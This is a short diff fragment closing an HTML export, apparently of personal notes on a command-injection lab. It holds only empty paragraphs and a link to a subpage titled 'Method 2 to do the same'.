+</p><p id="2803d8cd-fdcb-4a4b-9e8f-ed7a49747926" class="">
+</p><figure id="d2e01152-0c4c-4d28-bf71-93fab59dd53e" class="link-to-page"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Method%202%20to%20do%20the%20same%20This%20method%20works%20for%20this%20d2e011520c4c4d28bf7193fab59dd53e.html">Method 2 to do the same: This method works for this lab</a></figure><p id="e4eb5ac7-8555-4fb4-aecf-43137bdd0137" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
